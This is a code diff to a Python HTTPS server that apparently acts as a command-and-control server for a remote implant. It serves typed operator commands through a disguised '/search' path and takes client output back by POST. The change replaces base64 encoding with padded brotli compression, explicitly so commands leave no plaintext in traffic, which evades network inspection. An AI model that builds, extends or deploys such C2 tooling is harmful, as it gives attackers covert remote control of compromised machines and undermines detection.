@@ -12,12 +12,13 @@ import base64
 import threading
 import sys
 import random
+import brotli
 
 # Config
 PORT = 8000
 CERT_FILE = '../server.pem'
 
-currEncodedCmd = ""
+currCmd = ""
 logFileName = '../logs/logs.txt'
 
 log_file = ""
@@ -36,15 +37,20 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         
     # GET events
     def do_GET(self):
-        global currEncodedCmd
+        global currCmd
         global log_file        
         if self.path.startswith("/search"):
             self.send_response(200)
             self._set_headers()
-            self.wfile.write(currEncodedCmd)
-            log_file.write("Sent cmd: " + base64.b64decode(currEncodedCmd) + "\n")
-            log_file.flush()
-            currEncodedCmd = ""
+            if currCmd != "":
+
+                # padding, because if too short, brotli compress may contain plaintext
+                currEncodedCmd = brotli.compress("XXPADDINGXXPADDINGXXPADDINGXX" + currCmd)
+                self.wfile.write(currEncodedCmd)
+                log_file.write("Sent cmd: " + currCmd + "\n")
+                log_file.flush()
+                currCmd = ""
+                currEncodedCmd = ""
         else:
             self.send_response(404)
             self._set_headers()
@@ -58,7 +64,8 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         global log_file  
         if self.path.startswith("/search"):
             content_length = int(self.headers['Content-Length'])
-            resp = base64.b64decode(self.rfile.read(content_length))
+            resp = brotli.decompress(self.rfile.read(content_length))
+            resp = resp.replace("XXPADDINGXXPADDINGXXPADDINGXX","")
             if resp == "EXIT OK":
                 stop_server()
             else:
@@ -145,8 +152,7 @@ if __name__ == '__main__':
         print ""
         while True:
             wait = True
-            currcmd = raw_input(">")
-            currEncodedCmd = str(base64.b64encode(currcmd.encode("utf-8")))
+            currCmd = raw_input(">")
             # Wait for client's reply
             while (wait == True):
                 pass
